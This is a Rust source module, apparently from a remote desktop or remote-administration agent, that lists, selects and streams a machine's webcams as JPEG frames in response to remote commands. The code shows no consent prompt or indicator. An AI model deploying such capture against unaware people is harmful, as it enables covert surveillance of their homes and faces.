use std::{
    sync::{Arc, atomic::Ordering},
    time::Duration,
};

use nokhwa::{
    Camera,
    pixel_format::RgbFormat,
    utils::{ApiBackend, CameraIndex, RequestedFormat, RequestedFormatType},
};
use tokio_util::sync::CancellationToken;

use crate::{
    commands::Ctx,
    protocol::{self, Obj},
    state::Outbound,
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "webcam_list" => webcam_list(&ctx).await,
        "webcam_select" => {
            let index = ctx.integer("index").unwrap_or(0).max(0) as usize;
            ctx.state.webcam_selected.store(index, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "webcam_set_fps" => {
            let running = ctx
                .state
                .webcam
                .lock()
                .map(|guard| guard.is_some())
                .unwrap_or(false);
            if running {
                ctx.out
                    .result(&ctx.command, false, Some("stop webcam before changing fps"))
                    .await;
                return;
            }
            let fps = ctx.integer("fps").unwrap_or(30).clamp(1, 120) as u32;
            ctx.state.webcam_fps.store(fps, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "webcam_set_quality" => {
            let quality = ctx.integer("quality").unwrap_or(0);
            let quality = if quality <= 0 { 80 } else { quality.clamp(1, 100) } as u32;
            ctx.state.webcam_quality.store(quality, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "webcam_start" => {
            let state = ctx.state.clone();
            let out = ctx.out.clone();
            let index = state.webcam_selected.load(Ordering::Relaxed);
            let fps = state.webcam_fps.load(Ordering::Relaxed);
            let quality = state.webcam_quality.load(Ordering::Relaxed);
            let cancel = CancellationToken::new();
            crate::state::set_stream(&state.webcam, cancel.clone(), state.desktop_settings.clone());
            tokio::task::spawn_blocking(move || {
                run_stream(out, cancel, index, fps, quality);
            });
            ctx.out.result(&ctx.command, true, None).await;
        }
        "webcam_stop" => {
            crate::state::cancel_stream(&ctx.state.webcam);
            ctx.out.result(&ctx.command, true, None).await;
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown webcam command"))
                .await;
        }
    }
}

async fn webcam_list(ctx: &Ctx) {
    let result = tokio::task::spawn_blocking(|| {
        nokhwa::query(ApiBackend::Auto).map(|devices| {
            devices
                .into_iter()
                .enumerate()
                .map(|(index, info)| {
                    Obj::new()
                        .put(protocol::key_index(), protocol::n(index as i64))
                        .put(protocol::key_name(), protocol::owned(info.human_name()))
                        .value()
                })
                .collect::<Vec<_>>()
        })
    })
    .await;
    match result {
        Ok(Ok(devices)) => {
            let selected = ctx.state.webcam_selected.load(Ordering::Relaxed) as i64;
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("webcam_devices"))
                        .put(protocol::key_devices(), protocol::arr(devices))
                        .put(protocol::key_selected(), protocol::n(selected))
                        .value(),
                )
                .await;
            ctx.out.result(&ctx.command, true, None).await;
        }
        Ok(Err(error)) => {
            ctx.out
                .result(&ctx.command, false, Some(&error.to_string()))
                .await
        }
        Err(error) => {
            ctx.out
                .result(&ctx.command, false, Some(&error.to_string()))
                .await
        }
    }
}

fn run_stream(out: Outbound, cancel: CancellationToken, index: usize, fps: u32, quality: u32) {
    let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
    let mut camera = match Camera::new(CameraIndex::Index(index as u32), requested) {
        Ok(camera) => camera,
        Err(_) => return,
    };
    let _ = camera.set_frame_rate(fps);
    if camera.open_stream().is_err() {
        return;
    }
    let frame_time = Duration::from_millis(1000 / u64::from(fps.max(1)));
    while !cancel.is_cancelled() {
        let started = std::time::Instant::now();
        let frame = match camera.frame() {
            Ok(frame) => frame,
            Err(_) => break,
        };
        let Ok(image) = frame.decode_image::<RgbFormat>() else {
            continue;
        };
        let (width, height) = image.dimensions();
        let Some(encoded) = crate::media::encode_jpeg(
            image.as_raw(),
            width as i32,
            height as i32,
            quality.clamp(1, 100) as u8,
        ) else {
            continue;
        };
        out.blocking_send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("frame"))
                .put(
                    protocol::key_header(),
                    Obj::new()
                        .put(protocol::key_monitor(), protocol::n(0))
                        .put(protocol::key_fps(), protocol::n(fps as i64))
                        .put(protocol::key_format(), protocol::s("jpeg"))
                        .put(protocol::key_width(), protocol::n(width as i64))
                        .put(protocol::key_height(), protocol::n(height as i64))
                        .put(protocol::key_webcam(), protocol::b(true))
                        .value(),
                )
                .put(protocol::key_data(), protocol::bin(encoded))
                .value(),
        );
        let elapsed = started.elapsed();
        if elapsed < frame_time {
            std::thread::sleep(frame_time - elapsed);
        }
    }
    let _ = camera.stop_stream();
    let _ = Arc::new(());
}
